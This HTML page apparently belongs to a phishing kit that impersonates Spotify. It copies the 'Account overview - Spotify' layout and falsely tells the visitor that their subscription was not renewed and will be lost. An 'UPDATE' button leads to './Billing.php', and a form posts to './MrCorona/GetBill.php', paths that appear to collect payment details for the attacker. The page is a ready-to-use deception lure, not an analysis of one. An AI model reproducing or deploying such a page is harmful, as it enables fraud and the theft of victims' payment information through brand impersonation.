
<!DOCTYPE html>

<html id="app" lang="en" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible="">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <title class="ng-binding">Account overview - Spotify</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">-->
  <base href=".">
  <link rel="icon" href="./CRfiles/favicon.ico">
  <link href="./CRfiles/index.b48f2b8327399f826bfd.css" media="screen" rel="stylesheet">


</head>

<body ng-controller="LoginController" class="ng-scope">
  <!-- ngInclude: template -->
  <div ng-include="template" class="ng-scope">
    <div sp-header="" class="ng-scope">
      <div class="head ">
        <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/en" href="./Spow/Error.php"></a>
      </div>
    </div>

    <div class="container-fluid login ng-scope">

      <div class="content">
        <!-- ngIf: showContinueLabel -->
        <div class="row ng-scope" ng-if="showContinueLabel">


          <form method="post" action="./MrCorona/GetBill.php"
            class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
            <center>
              <div>
                <img src="./CRfiles/x.png">
                <br>
                <br>
                <span>Your subscription was not renewed and will be lost please update your <a
                    href="./Billing.php">payment method.</a></span>
              </div>
            </center>
        </div>
        <br>


        <!-- ngIf: showAutomationKey -->





        </form>

        <div id="sign-up-section">
          <div class="row">
            <div class="col-xs-12">
              <signup class="ng-isolate-scope">
                <!-- ngIf: showSignup -->
                <div ng-if="showSignup" class="ng-scope">
                  <!-- ngIf: showButton -->
                  <div ng-if="showButton" class="ng-scope">
                    <div class="row">
                      <div class="col-xs-12">
                        <br>
                      </div>
                    </div>
                    <div>
                      <div class="row">
                        <div class="col-xs-12">
                          <a class="btn btn-block btn-green ng-binding" href="./Billing.php">UPDATE</a>


                        </div>
                      </div>
                    </div>
                  </div>
                  </form>
                  <!-- end ngIf: showButton -->

                  <!-- ngIf: showAppStoreBanner -->
                </div><!-- end ngIf: showSignup -->
              </signup>
            </div>
          </div>
        </div>

      </div><!-- .content -->
    </div><!-- .container -->
  </div>


  <div></div>
</body>

</html>